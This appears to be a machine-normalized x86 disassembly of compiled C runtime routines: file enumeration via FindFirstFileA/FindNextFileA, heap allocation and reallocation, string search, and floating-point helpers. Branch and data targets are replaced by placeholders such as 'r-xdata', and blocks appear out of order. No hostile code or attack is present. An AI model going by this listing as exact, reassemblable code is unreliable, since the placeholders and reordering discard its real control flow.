movzx eax [ ebp - 0xc ]
push 0xffffffff
push eax
movzx eax [ ebp - 0xe ]
push eax
movzx eax [ ebp - 0x10 ]
push eax
movzx eax [ ebp - 0x12 ]
push eax
movzx eax [ ebp - 0x16 ]
push eax
movzx eax [ ebp - 0x18 ]
push eax
call sub_414d97
add esp 0x1c
leave
retn
sub_40f52a
push ebp
mov ebp esp
sub esp 0x144
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
xor edi edi
cmp esi edi
jne r-xdata
cmp eax edi
je r-xdata
call sub_412089
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_41202a
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push ebx
lea ecx [ ebp - 0x144 ]
push ecx
push eax
call [ FindFirstFileA@IAT ]
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_413965
leave
retn
mov eax [ ebp - 0x144 ]
sub eax 0x80
neg eax
sbb eax eax
and eax [ ebp - 0x144 ]
mov [ esi ] eax
lea eax [ ebp - 0x140 ]
push eax
call sub_40f4c4
mov [ esi + 0x8 ] eax
lea eax [ ebp - 0x138 ]
push eax
mov [ esi + 0xc ] edx
call sub_40f4c4
mov [ esi + 0x10 ] eax
lea eax [ ebp - 0x130 ]
push eax
mov [ esi + 0x14 ] edx
call sub_40f4c4
mov [ esi + 0x18 ] eax
mov eax [ ebp - 0x124 ]
mov [ esi + 0x20 ] eax
lea eax [ ebp - 0x118 ]
push eax
mov [ esi + 0x1c ] edx
push 0x104
add esi 0x24
push esi
call sub_415600
add esp 0x18
test eax eax
je r-xdata
call [ GetLastError@IAT ]
push 0x2
pop esi
cmp eax esi
jb r-xdata
mov eax ebx
push edi
push edi
push edi
push edi
push edi
call sub_411f2e
add esp 0x14
call sub_412089
mov [ eax ] 0x16
cmp eax 0x3
jbe r-xdata
pop ebx
call sub_412089
mov [ eax ] esi
jmp r-xdata
cmp eax 0x8
je r-xdata
or eax 0xffffffff
jmp r-xdata
call sub_412089
mov [ eax ] 0xc
jmp r-xdata
cmp eax 0x12
je r-xdata
sub_40f65a
push ebp
mov ebp esp
sub esp 0x144
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp eax 0xffffffff
push esi
mov esi [ ebp + 0xc ]
push edi
jne r-xdata
xor edi edi
cmp esi edi
jne r-xdata
call sub_412089
xor edi edi
lea ecx [ ebp - 0x144 ]
push ecx
push eax
call [ FindNextFileA@IAT ]
test eax eax
jne r-xdata
call sub_412089
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_413965
leave
retn
mov eax [ ebp - 0x144 ]
sub eax 0x80
neg eax
sbb eax eax
and eax [ ebp - 0x144 ]
mov [ esi ] eax
lea eax [ ebp - 0x140 ]
push eax
call sub_40f4c4
mov [ esi + 0x8 ] eax
lea eax [ ebp - 0x138 ]
push eax
mov [ esi + 0xc ] edx
call sub_40f4c4
mov [ esi + 0x10 ] eax
lea eax [ ebp - 0x130 ]
push eax
mov [ esi + 0x14 ] edx
call sub_40f4c4
mov [ esi + 0x18 ] eax
mov eax [ ebp - 0x124 ]
mov [ esi + 0x20 ] eax
lea eax [ ebp - 0x118 ]
push eax
mov [ esi + 0x1c ] edx
push 0x104
add esi 0x24
push esi
call sub_415600
add esp 0x18
test eax eax
je r-xdata
call [ GetLastError@IAT ]
push 0x2
pop esi
cmp eax esi
jb r-xdata
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_41202a
add esp 0x14
xor eax eax
push edi
push edi
push edi
push edi
push edi
call sub_411f2e
add esp 0x14
call sub_412089
mov [ eax ] 0x16
jmp r-xdata
cmp eax 0x3
jbe r-xdata
or eax 0xffffffff
jmp r-xdata
call sub_412089
mov [ eax ] esi
jmp r-xdata
cmp eax 0x8
je r-xdata
call sub_412089
mov [ eax ] 0xc
jmp r-xdata
cmp eax 0x12
je r-xdata
sub_40f789
push 0xc
push r--data
call sub_412340
xor ebx ebx
mov [ ebp - 0x1c ] ebx
xor eax eax
mov edi [ ebp + 0x8 ]
cmp edi ebx
setne al
cmp eax ebx
jne r-xdata
xor eax eax
mov esi [ ebp + 0xc ]
cmp esi ebx
setne al
cmp eax ebx
je r-xdata
call sub_412089
mov [ eax ] 0x16
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_41202a
add esp 0x14
xor eax eax
cmp [ esi ] bl
setne al
cmp eax ebx
je r-xdata
call sub_412385
retn
call sub_415907
mov [ ebp + 0x8 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0x4 ] ebx
cmp [ edi ] bl
jne r-xdata
call sub_412089
mov [ eax ] 0x18
jmp r-xdata
push eax
push [ ebp + 0x10 ]
push esi
push edi
call sub_415665
add esp 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40f843
mov eax [ ebp - 0x1c ]
call sub_412089
mov [ eax ] 0x16
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call sub_415a30
add esp 0xc
jmp r-xdata
xor eax eax
jmp r-xdata
sub_40f860
push 0x10
push r--data
call sub_412340
xor eax eax
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
setne al
cmp eax ebx
jne r-xdata
xor eax eax
mov esi [ ebp + 0xc ]
cmp esi ebx
setne al
cmp eax ebx
je r-xdata
call sub_412089
mov [ eax ] 0x16
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_41202a
add esp 0x14
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_412385
retn
push [ ebp + 0x8 ]
call sub_415b90
mov [ ebp - 0x1c ] eax
push esi
call sub_40e58e
pop ecx
pop ecx
mov [ ebp - 0x4 ] ebx
push esi
call sub_412a19
mov edi eax
push esi
push [ ebp - 0x1c ]
push 0x1
push [ ebp + 0x8 ]
call sub_40ea04
mov [ ebp - 0x20 ] eax
push esi
push edi
call sub_412aaf
add esp 0x1c
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40f99a
xor eax eax
mov ecx [ ebp - 0x1c ]
cmp [ ebp - 0x20 ] ecx
sete al
dec eax
push esi
call sub_40ebab
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax rw-data
push esi
call sub_40ebab
pop ecx
cmp eax 0xfffffffe
je r-xdata
push esi
call sub_40ebab
pop ecx
cmp eax 0xffffffff
je r-xdata
push esi
call sub_40ebab
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
push esi
call sub_40ebab
pop ecx
pop ecx
and eax 0x1f
imul eax eax 0x28
add eax [ edi ]
jmp r-xdata
mov eax rw-data
push esi
call sub_40ebab
pop ecx
cmp eax 0xfffffffe
je r-xdata
test [ eax + 0x24 ] 0x7f
jne r-xdata
push esi
call sub_40ebab
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
push esi
call sub_40ebab
pop ecx
pop ecx
and eax 0x1f
imul eax eax 0x28
add eax [ edi ]
jmp r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
sub_40f9a2
push ebp
mov ebp esp
sub esp 0x20
push ebx
xor ebx ebx
cmp [ ebp + 0xc ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
call sub_412089
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_41202a
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push esi
push [ ebp + 0x14 ]
mov [ ebp - 0x18 ] eax
push [ ebp + 0x10 ]
mov [ ebp - 0x20 ] eax
push [ ebp + 0xc ]
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x1c ] 0x7fffffff
mov [ ebp - 0x14 ] 0x42
call sub_412b7f
add esp 0x10
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
pop ebx
leave
retn
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_4139ac
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax esi
pop esi
sub_40fa35
push ebp
mov ebp esp
sub esp 0x20
push ebx
xor ebx ebx
cmp [ ebp + 0xc ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
call sub_412089
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_41202a
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp + 0x10 ]
push eax
push ebx
push [ ebp + 0xc ]
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x1c ] 0x7fffffff
mov [ ebp - 0x14 ] 0x42
call sub_412b7f
add esp 0x10
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
pop ebx
leave
retn
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_4139ac
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax esi
pop esi
sub_40fb30
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x100
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_4167ae
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_40fbb0
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ esp + 0x4 ]
call sub_416f15
sub esp 0x8
stmxcsr [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
and eax 0x1f80
cmp eax 0x1f80
jne r-xdata
lea esp [ esp + 0x8 ]
jne r-xdata
fnstcw [ esp ]
mov ax [ esp ]
and ax 0x7f
cmp ax 0x7f
jmp sub_416878
sub_40fbf0
cmp [ rw-data ] 0x0
je r-xdata
sub esp 0xc
fst [ esp ]
call sub_416f58
call sub_40fc48
add esp 0xc
retn
sub esp 0x8
stmxcsr [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
and eax 0x1f80
cmp eax 0x1f80
jne r-xdata
lea esp [ esp + 0x8 ]
jne r-xdata
fnstcw [ esp ]
mov ax [ esp ]
and ax 0x7f
cmp ax 0x7f
jmp sub_416860
sub_40fc48
push edx
fwait
fnstcw [ esp ]
je r-xdata
test eax 0xfffff
jne r-xdata
mov eax [ esp + 0xc ]
cmp [ esp ] 0x27f
je r-xdata
call sub_416efc
jmp r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
test eax 0x7ff00000
je r-xdata
fldcw [ r--data ]
cmp [ rw-data ] 0x0
jne r-xdata
and eax 0x80000000
je r-xdata
test eax 0xfffff
jne r-xdata
test eax 0x80000000
jne r-xdata
cmp [ esp ] 0x27f
je r-xdata
lea ecx [ rw-data ]
mov edx 0x1b
call sub_417077
pop edx
retn
cmp [ rw-data ] 0x0
jne r-xdata
fstp st0
fld [ rw-data ]
mov eax 0x1
jmp r-xdata
test eax 0x80000000
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
fldlg2
fxch st1
fyl2x
pop edx
retn
fldcw [ esp ]
lea ecx [ rw-data ]
mov edx 0x1b
jmp r-xdata
jmp r-xdata
fstp st0
fld [ rw-data ]
mov eax 0x2
mov ax [ esp ]
cmp ax 0x27f
je r-xdata
pop edx
retn
and ax 0x20
je r-xdata
fldcw [ esp ]
fwait
fnstsw ax
and ax 0x20
je r-xdata
mov eax 0x8
call sub_417077
pop edx
retn
sub_40fd00
cmp [ rw-data ] 0x0
je r-xdata
push ebp
mov ebp esp
sub esp 0x20
and esp 0xfffffff0
fld st0
fst [ esp + 0x18 ]
fistp [ esp + 0x10 ]
fild [ esp + 0x10 ]
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
push ebp
mov ebp esp
sub esp 0x8
and esp 0xfffffff8
fstp [ esp ]
cvttsd2si eax [ esp ]
leave
retn
mov edx [ esp + 0x14 ]
test edx 0x7fffffff
jne r-xdata
fsubp st1
test edx edx
jns r-xdata
fstp [ esp + 0x18 ]
fstp [ esp + 0x18 ]
fstp [ esp ]
mov ecx [ esp ]
add ecx 0x7fffffff
sbb eax 0x0
mov edx [ esp + 0x14 ]
sbb edx 0x0
jmp r-xdata
fstp [ esp ]
mov ecx [ esp ]
xor ecx 0x80000000
add ecx 0x7fffffff
adc eax 0x0
mov edx [ esp + 0x14 ]
adc edx 0x0
jmp r-xdata
leave
retn
sub_40fdab
push 0xc
push r--data
call sub_412340
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_412385
retn
cmp [ rw-data ] 0x3
jne r-xdata
push esi
push 0x4
call sub_411ef3
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_4171b0
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
call sub_412089
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_41204e
mov [ esi ] eax
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40fe01
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
push esi
push eax
call sub_4171db
pop ecx
pop ecx
push [ ebp + 0x8 ]
jmp r-xdata
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
sub_40fe39
push 0xc
push r--data
call sub_412340
and [ ebp - 0x1c ] 0x0
mov esi [ ebp + 0x8 ]
cmp esi [ rw-data ]
ja r-xdata
mov eax [ ebp - 0x1c ]
call sub_412385
retn
push 0x4
call sub_411ef3
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_417984
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40fe7f
sub_40fe88
push ebp
mov ebp [ esp + 0x8 ]
cmp ebp 0xffffffe0
ja r-xdata
push ebp
call sub_4129f7
pop ecx
call sub_412089
mov [ eax ] 0xc
xor eax eax
pop ebp
retn
push ebx
mov ebx [ HeapAlloc@IAT ]
push esi
push edi
mov eax [ rw-data ]
cmp eax 0x1
jne r-xdata
call sub_411d44
push 0x1e
call sub_411ba4
push 0xff
call sub_40e0aa
cmp eax 0x3
jne r-xdata
cmp ebp esi
je r-xdata
cmp ebp esi
jne r-xdata
push ebp
call sub_40fe39
cmp eax esi
pop ecx
jne r-xdata
xor eax eax
inc eax
mov eax ebp
jmp r-xdata
add edi 0xf
and edi 0xfffffff0
push edi
xor edi edi
inc edi
mov esi eax
test esi esi
jne r-xdata
push esi
push [ rw-data ]
call ebx
push eax
jmp r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] eax
push 0xc
pop edi
je r-xdata
call sub_412089
mov [ eax ] edi
push ebp
call sub_4129f7
test eax eax
pop ecx
jne r-xdata
xor esi esi
cmp [ rw-data ] esi
mov edi ebp
jne r-xdata
jmp r-xdata
call sub_412089
mov [ eax ] edi
sub_40ff50
cmp [ rw-data ] 0x0
je r-xdata
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi 0xffff
push esi
push [ rw-data ]
call sub_41da62
fld [ ebp + 0x8 ]
pop ecx
pop ecx
mov ebx eax
mov eax [ ebp + 0xe ]
push ecx
and ax 0x7ff0
cmp ax 0x7ff0
push ecx
fstp [ esp ]
jne r-xdata
sub esp 0x8
stmxcsr [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
and eax 0x1f80
cmp eax 0x1f80
jne r-xdata
call sub_41d906
fstp [ ebp - 0x8 ]
fld [ ebp + 0x8 ]
pop ecx
fcomp [ ebp - 0x8 ]
pop ecx
fnstsw ax
test ah 0x44
jpe r-xdata
call sub_41d941
test eax eax
pop ecx
pop ecx
jle r-xdata
lea esp [ esp + 0x8 ]
jne r-xdata
fnstcw [ esp ]
mov ax [ esp ]
and ax 0x7f
cmp ax 0x7f
test bl 0x20
jne r-xdata
push esi
push ebx
call sub_41da62
fld [ ebp - 0x8 ]
pop ecx
pop ecx
jmp r-xdata
fld [ ebp + 0x8 ]
push ebx
fadd [ r--data ]
sub esp 0x10
fstp [ esp + 0x8 ]
fld [ ebp + 0x8 ]
fstp [ esp ]
push 0xb
push 0x8
jmp r-xdata
cmp eax 0x2
jle r-xdata
jmp r-xdata
fld [ ebp - 0x8 ]
push ebx
sub esp 0x10
fstp [ esp + 0x8 ]
fld [ ebp + 0x8 ]
fstp [ esp ]
push 0xb
push 0x10
pop esi
pop ebx
leave
retn
call sub_41d84c
add esp 0x1c
push esi
push ebx
call sub_41da62
fld [ ebp + 0x8 ]
pop ecx
pop ecx
jmp r-xdata
cmp eax 0x3
jne r-xdata
movq xmm0 [ esp + 0x4 ]
movapd xmm2 [ r--data ]
movapd xmm1 xmm0
movapd xmm7 xmm0
psrlq xmm0 0x34
movd eax xmm0
andpd xmm0 [ r--data ]
psubd xmm2 xmm0
psrlq xmm1 xmm2
test eax 0x800
jne r-xdata
fld [ ebp + 0x8 ]
push ebx
push ecx
push ecx
fstp [ esp ]
push 0xb
call sub_41d7f9
add esp 0x10
jmp r-xdata
movq xmm0 [ esp + 0x4 ]
psllq xmm1 xmm2
movapd xmm3 xmm0
cmppd xmm0 xmm1 0x1
cmp eax 0xbff
jl r-xdata
cmp eax 0x3ff
jl r-xdata
cmppd xmm3 [ r--data ] 0x1
orpd xmm3 [ r--data ]
andpd xmm3 [ r--data ]
movq [ esp + 0x4 ] xmm3
fld [ esp + 0x4 ]
retn
cmp eax 0xc32
jg r-xdata
fldz
retn
psllq xmm1 xmm2
cmp eax 0x432
jg r-xdata
ucomisd xmm7 xmm7
jpo r-xdata
andpd xmm0 [ r--data ]
subsd xmm1 xmm0
movq [ esp + 0x4 ] xmm1
fld [ esp + 0x4 ]
retn
movq [ esp + 0x4 ] xmm1
fld [ esp + 0x4 ]
retn
fld [ esp + 0x4 ]
retn
mov edx 0x3ed
sub esp 0x10
mov [ esp + 0xc ] edx
mov edx esp
add edx 0x14
mov [ esp + 0x8 ] edx
mov [ esp + 0x4 ] edx
mov [ esp ] edx
call sub_417c67
add esp 0x10
sub_410071
push 0xc
push r--data
call sub_412340
xor ebx ebx
mov [ ebp - 0x1c ] ebx
xor eax eax
mov esi [ ebp + 0x8 ]
cmp esi ebx
setne al
cmp eax ebx
jne r-xdata
push esi
call sub_40e58e
pop ecx
mov [ ebp - 0x4 ] ebx
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_412089
mov [ eax ] 0x16
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_41202a
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp [ ebp - 0x1c ] ebx
jne r-xdata
push esi
call sub_40ebab
pop ecx
cmp eax 0xffffffff
je r-xdata
call sub_412385
retn
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4101a0
mov eax [ ebp - 0x1c ]
dec [ esi + 0x4 ]
js r-xdata
mov eax rw-data
push esi
call sub_40ebab
pop ecx
cmp eax 0xfffffffe
je r-xdata
push esi
call sub_413b0c
pop ecx
mov ecx [ esi ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
call sub_412089
mov [ eax ] 0x16
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_41202a
add esp 0x14
or [ ebp - 0x1c ] 0xffffffff
push esi
call sub_40ebab
pop ecx
cmp eax 0xffffffff
je r-xdata
push esi
call sub_40ebab
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
push esi
call sub_40ebab
pop ecx
pop ecx
and eax 0x1f
imul eax eax 0x28
add eax [ edi ]
jmp r-xdata
mov [ ebp - 0x1c ] eax
mov eax rw-data
push esi
call sub_40ebab
pop ecx
cmp eax 0xfffffffe
je r-xdata
test [ eax + 0x24 ] 0x7f
jne r-xdata
push esi
call sub_40ebab
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
push esi
call sub_40ebab
pop ecx
pop ecx
and eax 0x1f
imul eax eax 0x28
add eax [ edi ]
jmp r-xdata
test [ eax + 0x24 ] 0x80
je r-xdata
sub_4101a8
push 0xc
push r--data
call sub_412340
xor eax eax
xor esi esi
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
jne r-xdata
call sub_40e4b7
push 0x20
pop ebx
add eax ebx
push eax
push 0x1
call sub_40e5bd
pop ecx
pop ecx
mov [ ebp - 0x4 ] esi
call sub_40e4b7
add eax ebx
push eax
call sub_412a19
pop ecx
mov edi eax
lea eax [ ebp + 0xc ]
push eax
push esi
push [ ebp + 0x8 ]
call sub_40e4b7
add eax ebx
push eax
call sub_412b7f
mov [ ebp - 0x1c ] eax
call sub_40e4b7
add eax ebx
push eax
push edi
call sub_412aaf
add esp 0x18
mov [ ebp - 0x4 ] 0xfffffffe
call sub_410244
mov eax [ ebp - 0x1c ]
call sub_412089
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_41202a
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_412385
retn
sub_41026d
push 0x10
push r--data
call sub_412340
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_40fe88
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
push ebx
call sub_40fdab
pop ecx
jmp r-xdata
call sub_412385
retn
cmp esi 0xffffffe0
jbe r-xdata
xor edi edi
mov [ ebp - 0x1c ] edi
cmp esi 0xffffffe0
ja r-xdata
xor eax eax
test esi esi
jne r-xdata
push esi
call sub_4129f7
pop ecx
call sub_412089
push 0x4
call sub_411ef3
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_4171b0
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4103b1
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
cmp esi [ rw-data ]
ja r-xdata
mov eax edi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
mov edi [ ebp - 0x1c ]
test esi esi
jne r-xdata
cmp [ ebp - 0x1c ] edi
jne r-xdata
push esi
push ebx
push eax
call sub_4176a5
add esp 0xc
test eax eax
je r-xdata
test edi edi
jne r-xdata
push esi
call sub_4129f7
pop ecx
test eax eax
je r-xdata
cmp [ rw-data ] edi
je r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
jmp r-xdata
inc esi
cmp esi edi
jne r-xdata
push esi
call sub_417984
pop ecx
mov [ ebp - 0x1c ] eax
cmp eax edi
je r-xdata
mov [ ebp - 0x1c ] ebx
jmp r-xdata
call sub_412089
call sub_412089
jmp r-xdata
test edi edi
jne r-xdata
push esi
call sub_4129f7
pop ecx
test eax eax
jne r-xdata
test edi edi
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push edi
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ ebp - 0x1c ] eax
cmp eax edi
je r-xdata
xor esi esi
inc esi
mov [ ebp + 0xc ] esi
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_41204e
pop ecx
mov [ esi ] eax
jmp r-xdata
call sub_412089
cmp [ ebp - 0x20 ] edi
je r-xdata
call sub_412089
cmp [ ebp - 0x20 ] edi
jne r-xdata
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
push eax
push ebx
push [ ebp - 0x1c ]
call sub_410ec0
push ebx
call sub_4171b0
mov [ ebp - 0x20 ] eax
push ebx
push eax
call sub_4171db
add esp 0x18
mov eax esi
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_41204e
mov [ esi ] eax
pop ecx
mov [ eax ] 0xc
jmp r-xdata
mov [ eax ] 0xc
push eax
push ebx
push [ ebp - 0x1c ]
call sub_410ec0
push ebx
push [ ebp - 0x20 ]
call sub_4171db
add esp 0x14
mov eax esi
sub_410488
mov ecx [ esp + 0x8 ]
push esi
xor esi esi
cmp ecx esi
jbe r-xdata
imul ecx [ esp + 0x10 ]
push ecx
push [ esp + 0xc ]
call sub_41026d
pop ecx
pop ecx
pop esi
retn
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ esp + 0x10 ]
jae r-xdata
call sub_412089
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0xc
call sub_41202a
add esp 0x14
xor eax eax
pop esi
retn
sub_4104d0
mov ecx [ esp + 0x8 ]
push edi
push ebx
push esi
mov dl [ ecx ]
mov edi [ esp + 0x10 ]
test dl dl
je r-xdata
mov eax edi
pop esi
pop ebx
pop edi
retn
mov dh [ ecx + 0x1 ]
test dh dh
je r-xdata
xor eax eax
pop esi
pop ebx
pop edi
mov al dl
jmp r-xdata
mov esi edi
mov ecx [ esp + 0x14 ]
mov al [ edi ]
add esi 0x1
cmp al dl
je r-xdata
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
mov al [ esi ]
add esi 0x1
cmp al dh
jne r-xdata
test al al
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je r-xdata
cmp al dl
je r-xdata
lea edi [ esi - 0x1 ]
pop esi
pop ebx
pop edi
xor eax eax
retn
mov al [ esi ]
add esi 0x1
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
test al al
jne r-xdata
lea eax [ edi - 0x1 ]
pop esi
pop ebx
pop edi
retn
mov al [ esi ]
add esi 0x2
cmp al ah
jne r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
mov al [ ecx + 0x3 ]
test al al
je r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
mov ah [ esi - 0x1 ]
add ecx 0x2
cmp al ah
je r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
mov ah [ ecx + 0x2 ]
test ah ah
je r-xdata
jmp r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_410556
mov eax [ esp + 0x4 ]
test eax eax
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_4118e7
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_4189dd
mov [ esi ] eax
mov eax esi
pop esi
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_4182cc
mov [ esi + 0x4 ] eax
sub_4105d8
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
cmp edi ebx
push esi
jne r-xdata
push [ ebp + 0x8 ]
push edi
call sub_418e38
cmp eax [ ebp + 0x8 ]
pop ecx
pop ecx
jb r-xdata
call sub_412089
push 0x16
mov edx [ ebp + 0xc ]
mov eax [ edx ]
mov ecx [ eax + 0x14 ]
cmp ecx ebx
jne r-xdata
mov [ edi ] bl
jmp r-xdata
mov eax esi
push 0x1
push [ eax + 0x4 ]
mov esi 0x200
push ebx
push ebx
push 0xffffffff
push edi
push esi
push ecx
push edx
call sub_418df5
mov ecx eax
add esp 0x24
cmp ecx ebx
mov [ ebp - 0xc ] ecx
jne r-xdata
cmp [ edi ] bl
mov ecx edi
je r-xdata
cmp [ ebp + 0x8 ] ecx
jae r-xdata
call sub_412089
mov [ eax ] 0x2a
xor eax eax
